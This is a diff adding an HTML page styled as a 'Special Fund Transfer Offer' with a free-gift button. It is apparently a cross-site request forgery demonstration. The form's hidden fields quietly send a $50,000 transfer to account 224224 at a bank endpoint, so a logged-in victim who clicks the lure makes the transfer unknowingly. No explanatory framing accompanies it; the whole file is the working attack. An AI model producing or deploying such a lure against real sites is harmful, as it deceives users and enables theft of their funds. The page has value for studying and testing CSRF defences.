@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fund Transfer Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    form {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    h1 {
+      color: #007BFF;
+    }
+
+    p {
+      margin-top: 10px;
+      color: #555;
+    }
+
+    input[type="submit"] {
+      background-color: #007BFF;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <form action="http://bank.com/fundtransfer" method="POST">
+    <h1>Special Fund Transfer Offer!</h1>
+    <p>Transfer funds now and get a free gift worth $50!</p>
+    <input type="hidden" name="acct" value="224224"/>
+    <input type="hidden" name="amount" value="50000"/>
+    <input type="submit" value="Click to get your free gift!"/>
+  </form>
+
+</body>
+</html>
